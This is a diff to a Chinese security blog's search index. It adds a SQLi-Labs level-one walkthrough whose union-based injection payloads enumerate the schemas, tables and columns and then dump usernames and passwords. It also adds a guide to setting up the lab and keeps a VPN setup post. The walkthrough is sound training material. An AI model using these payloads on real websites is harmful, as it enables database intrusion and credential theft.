@@ -1,6 +1,33 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[SQLi-Labs第一关]]></title>
+    <url>%2Fsqli-libs-first%2F</url>
+    <content type="text"><![CDATA[前言 注入过程 一. 前言1. 什么是SQL注入所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。 二. 注入过程1. 测试环境 MySQL 5.5.53 PHP 5.6.27-nts Apache 2.4 2. 注入过程1）首先进入SQLi-Labs，选择第一题 2）在地址后输入?id=1，发现可以显示用户信息，说明不是数值查询 3）接下来尝试修改修改id值，发现一直到12都可以显示信息 4）在地址后输入?id=1&#39;，发现返回错误信息，表示存在SQL字符注入 5）将参数改为?id=1&#39; --+，发现返回信息正常，则说明是单引号字符型注入 6）使用order by判断行数，当行数增加到4时返回错误信息，说明共有3列数据 7）将id=1改为一个数据库不存在的id值，使用union select 1,2,3联合查询语句查看页面是否有显示位 可以看到，返回了2和3两个值，说明有两个显示位 8）利用sql查询语句依次爆破出数据库内的数据库名，表名，列名，字段信息 1?id=15&apos; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+ 9）查询security内的所有表名 1?id=15&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),3 --+ 10）爆破user表的列名 1?id=15&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),(select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;) --+ 可以看到列表名为id、username和password 11）最后查询所有的用户名和密码 1?id=15&apos; union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users) --+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>SQLi-Labs</tag>
+        <tag>报错注入</tag>
+        <tag>联合查询</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[SQL注入测试平台SQLi-Labs搭建]]></title>
+    <url>%2Fsqli-libs-install%2F</url>
+    <content type="text"><![CDATA[前言 环境搭建 一. 前言SQLi-Labs是一个专业的SQL注入练习平台，该平台包含了以下在测试场景中常见的注入类型： 1.报错注入（联合查询） ​ &nbsp;&nbsp;&nbsp;&nbsp;1）字符型 ​ &nbsp;&nbsp;&nbsp;&nbsp;2）数字型 2.报错注入（基于二次注入） 3.盲注 ​ &nbsp;&nbsp;&nbsp;&nbsp;1）基于布尔值 ​ &nbsp;&nbsp;&nbsp;&nbsp;2）基于时间 4.UPDATE型注入练习 5.INSERT型注入练习 6.HTTP头部注入 ​ &nbsp;&nbsp;&nbsp;&nbsp;1）基于Referer ​ &nbsp;&nbsp;&nbsp;&nbsp;2）基于UserAgent ​ &nbsp;&nbsp;&nbsp;&nbsp;3）基于Cookie 7.二次排序注入练习 对于学习SQL注入来说是一个优秀的平台。 二. 环境搭建1. 准备工作SQLi-Labs测试平台需要以下环境 Apache Tomcat MySQL PHP Java 本文使用的是phpstudy集成环境进行安装，Java的安装和配置本文就不再赘述 2. 安装过程2.1 下载并解压从GitHub上下载SQLi-Labs，解压到phpstudy的网站目录下 2.2 修改配置文件进入网站目录，在sql-connections文件夹下找到db-creds.inc文件，修改文件内容，将用户名和密码改成本地MySQL数据库的用户名和密码 2.3 安装打开浏览器，输入http://127.0.0.1/sqli-labs-master进入SQLi-Labs测试平台 点击Setup/reset Database for labs进行安装，出现以下界面则表示安装成功]]></content>
+      <categories>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>环境搭建</tag>
+        <tag>SQL注入</tag>
+        <tag>SQLi-Labs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[在Windows server 2008 R2 上搭建VPN服务器]]></title>
     <url>%2FwinServer08R2-vpn%2F</url>
     <content type="text"><![CDATA[前言 搭建过程 一. 前言1. 什么是VPN虚拟专用网络(VPN)的功能是：在公用网络上建立专用网络，进行加密通讯。在企业网络中有广泛应用。VPN网关通过对数据包的加密和数据包目标地址的转换实现远程访问。VPN有多种分类方式，主要是按协议进行分类。VPN可通过服务器、硬件、软件等多种方式实现。 二. 搭建过程1. Windows Server 搭建VPN服务器winserver- 打开服务器管理器，右击角色-添加角色 点击下一步，选择网络策略和访问服务 下一步，选择网络策略服务器和路由和远程访问服务 一路下一步完成安装 右击路由和远程访问，选择配置并启用路由和远程访问 下一步，选择自定义配置 下一步，选择VPN访问、NAT、LAN路由 下一步到最后，启动服务 进入路由和远程访问-IPv4，右击NAT，选择新增接口 选择本地连接 设置属性，勾选公用接口连接到Internet，并选择在此接口上启用NAT 接下来建立VPN访问用户，由于本机使用的是域环境，所以在Active Directory 域服务-Active Directory 用户和计算机-域名-User中创建用户，如果没有域环境在本机用户中创建即可 在中间空白处右击创建用户 创建完用户后记得更改用户属性 在属性中找到拨入选项卡，将网络访问权限改为允许访问 至此，Windows Server上的VPN服务器已经搭建完成，接下来去测试服务器是否能够正常连接 2. 使用Windows7连接测试在网络和共享中心里选择设置新的连接或网络 选择连接到工作区 选择使用我的Internet连接(VPN) 在Internet地址中输入VPN服务器的IP地址 输入刚才新建的用户 完成连接 从网络设置中可以看到，DNS服务器的地址是VPN服务器地址]]></content>
@@ -20,10 +47,10 @@
         <category>工具使用</category>
       </categories>
       <tags>
+        <tag>kali Linux</tag>
         <tag>Social-Engineer-Toolkit</tag>
         <tag>钓鱼网站</tag>
         <tag>社工</tag>
-        <tag>kali Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -47,9 +74,9 @@
         <category>环境搭建</category>
       </categories>
       <tags>
-        <tag>kali Linux</tag>
         <tag>环境搭建</tag>
         <tag>Shellinabox</tag>
+        <tag>kali Linux</tag>
         <tag>Ngrok</tag>
       </tags>
   </entry>
